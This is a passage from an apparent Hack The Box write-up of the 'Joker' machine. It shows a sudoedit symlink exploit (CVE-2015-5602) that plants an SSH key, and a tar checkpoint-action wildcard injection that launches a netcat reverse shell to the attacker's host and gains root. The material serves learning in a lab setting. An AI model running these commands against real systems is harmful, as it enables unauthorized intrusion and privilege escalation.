systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
lxd:x:107:65534::/var/lib/lxd/:/bin/false
uuidd:x:108:113::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
werkzeug:x:1000:1000::/var/www:
alekos:x:1001:1001:Alekos Gouzouvios,,,:/home/alekos:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ sudo -l
Matching Defaults entries for werkzeug on joker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, sudoedit_follow, !sudoedit_checkdir

User werkzeug may run the following commands on joker:
    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Werkzeug can run commands as Alekos on the remote machine. But if we take a look on the sudo version running on this machine:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ dpkg -l sudo
dpkg -l sudo
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name           Version      Architecture Description
+++-==============-============-============-=================================
ii  sudo           1.8.16-0ubun amd64        Provide limited super user privil
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; searchsploit sudoedit
------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                      |  Path
                                                                                    | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------ ----------------------------------------
(Tod Miller's) Sudo/SudoEdit 1.6.9p21/1.7.2p4 - Local Privilege Escalation          | exploits/multiple/local/11651.sh
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation    | exploits/linux/local/37710.txt
SudoEdit 1.6.8 - Local Change Permission                                            | exploits/linux/local/470.c
------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We will find an exploit for sudo version 1.8.14.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; searchsploit -x exploits/linux/local/37710.txt

# Exploit Title: sudo -e - a.k.a. sudoedit -  unauthorized privilege escalation
# Date: 07-23-2015
# Exploit Author: Daniel Svartman
# Version: Sudo &amp;lt;=1.8.14
# Tested on: RHEL 5/6/7 and Ubuntu (all versions)
# CVE: CVE-2015-5602.

Hello,

I found a security bug in sudo (checked in the latest versions of sudo
running on RHEL and ubuntu) when a user is granted with root access to
modify a particular file that could be located in a subset of directories.

It seems that sudoedit does not check the full path if a wildcard is used
twice (e.g. /home/*/*/file.txt), allowing a malicious user to replace the
file.txt real file with a symbolic link to a different location (e.g.
/etc/shadow).

I was able to perform such redirect and retrieve the data from the
/etc/shadow file.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sudoedit doesn’t check the full path if the code is used twice. Exactly the case we got.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ cd testing/
werkzeug@joker:~/testing$ mkdir bomb
werkzeug@joker:~/testing$ cd bomb
werkzeug@joker:~/testing/bomb$ ln -s /home/alekos/.ssh/authorized_keys layout.html
werkzeug@joker:~/testing/bomb$ ls
layout.html
werkzeug@joker:~/testing/bomb$ sudoedit -u alekos /var/www/testing/bomb/layout.html 
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have to create a new ssh key and paste it to the nano console:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/Documenti/joker/ssh_key
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/Documenti/joker/ssh_key.
Your public key has been saved in /root/Documenti/joker/ssh_key.pub.
The key fingerprint is:
SHA256:5bxxhYd0SNMsXJIK4C5mtPCc4OqukFYMgKglV2RkKNk root@lorenzooo
The key's randomart image is:
+---[RSA 3072]----+
|+o =* ..   o=*o  |
|B Eo .  .  .=*o  |
|.*o . .  ...o.o  |
|..o* +   +.  o   |
|  .oO . S + .    |
| o.o .     +     |
|+.        .      |
|+                |
|+o               |
+----[SHA256]-----+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; cat ssh_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCk4uBt00/4Uh82LxD/3FhgiBL3rKDbENSBEldNKdtdMd6ami2BMnN
lGeIZrApmXh7BoK+xvE2TUlPx5KBtkklvwY7Y45yHUdMJ97Zgk8eUKe2iuQE7p6UweiRDbTZ6Us4vJostkA+q/pxVfu
UlTAKsbZC2ad45AsKZirFeF7qhuh64NWvADPeG6zOQ4DtMHiJsQbcdBVlISPUr/haJ9nKnv23YxO9lBpOVfuUlOHBRJ
2wAq0CuJpu2u3lGQ5TENsy/0PCCxescYxE/aRBXa2H4CO/r+LKXAO1RLGwu1MyN15MI/vYeVOGQfoL4wnB4I+Vxus3q
3Y/DurwZwO6UqI/RByyvH45RA2nZHbn+IGyi8Lyi1ZArWRb7ZXK7d3b9P+lNwCimW5lSMYKFBzXZpOiosu+yBeAFDQH
unpQJ6ptABORE3BOt84kghh7L+Xiww5PkogL76CKa1j62y9a7fHrcQq0WsAGt/3vx0J2rWpBqHZYRfk+KHNc2Fl02pH
QfxGM= root@lorenzooo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; ssh -i ssh_key alekos@10.10.10.21
Welcome to Ubuntu 16.10 (GNU/Linux 4.8.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Sat May 20 16:38:08 2017 from 10.10.13.210
alekos@joker:~$ whoami &amp;amp;&amp;amp; pwd &amp;amp;&amp;amp; id &amp;amp;&amp;amp; cat /home/alekos/user.txt
alekos
/home/alekos
uid=1001(alekos) gid=1001(alekos) groups=1001(alekos),1000(werkzeug)
a298121179fe93f2978d3337dbd7057b
alekos@joker:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privesc-to-root&quot;&gt;PrivEsc to Root&lt;/h2&gt;

&lt;p&gt;Inside of alekos’ home directory are two interesting directorys, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;development&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup&lt;/code&gt; is a folder containing backups of what looks to be the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;development&lt;/code&gt; folder which based off timestamps is running every five minutes. We can also see the tar files are owned by root.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/backup$ ls -lah
total 496K
drwxrwx--- 2 root   alekos  12K Apr 26 18:35 .
drwxr-xr-x 7 alekos alekos 4.0K May 19  2017 ..
-rw-r----- 1 root   alekos  40K Dec 24  2017 dev-1514134201.tar.gz
-rw-r----- 1 root   alekos  40K Dec 24  2017 dev-1514134501.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 17:50 dev-1587912601.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 17:55 dev-1587912901.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:00 dev-1587913201.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:05 dev-1587913501.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:10 dev-1587913801.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:15 dev-1587914101.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:20 dev-1587914401.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:25 dev-1587914701.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:30 dev-1587915001.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:35 dev-1587915301.tar.gz
alekos@joker:~/backup$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since we don’t have any crontab for Alekos, it seems logical that whatever is running the backup is probably running something like tar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cf *&lt;/code&gt;. Yet again another wildcard we can exploit.&lt;/p&gt;

&lt;p&gt;The options we are going to use are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--checkpoint&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--checkpoint-action&lt;/code&gt;. With tar you can specify checkpoints and a checkpoint action which will run commands at each checkpoint. So all we have to do is set a checkpoint action to run another python UDP shell.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~$ mv development/ development.bak
alekos@joker:~$ ln -s /root/ development
alekos@joker:~$ cd development.bak/
alekos@joker:~/development.bak$ touch -- --checkpoint=1
alekos@joker:~/development.bak$ touch -- '--checkpoint-action=exec=sh shell.sh'
alekos@joker:~/development.bak$ nano shell.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/development.bak$ sed 's/tmp\/f/tmp\/i/g' shell.sh
#!/bin/bash
rm /tmp/i
mkfifo /tmp/i
cat /tmp/i|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.27 4445 &amp;gt;/tmp/i
alekos@joker:~/development.bak$ sed 's/tmp\/f/tmp\/i/g' shell.sh -i
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/development.bak$ cd ..
alekos@joker:~$ rm development
alekos@joker:~$ mv development.bak/ development
alekos@joker:~$ cd development/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/development$ date
Sun Apr 26 19:41:37 EEST 2020
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; nc -u -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.21] 57510
/bin/sh: 0: can't access tty; job control turned off
# python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
root@joker:/home/alekos/development# id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; cat /root/root.txt
id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; cat /root/root.txt
uid=0(root) gid=0(root) groups=0(root)
root
d452b7faf5fd5b30210f340ef1d4146e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;hack-only-for-fun-and-learning-not-for-profit&quot;&gt;Hack only for fun and learning. Not for profit&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><category term="Joker" /><category term="Squid-Proxy" /><category term="Sudo Abuse" /><category term="SymLink" /><summary type="html">Joker was a hard box with a Http-Proxy-Squid that allows us through the TFTP to retrieve the username and password. The credentials we retrieve can be used to access the site where, bruteforcing the directories we will find a Python Console. After taking a shell, we will use sudo to create a symlink with our ssh key, to access with the user Alekos. For the privesc we will abuse a crontab which saves archivies as root.</summary></entry></feed>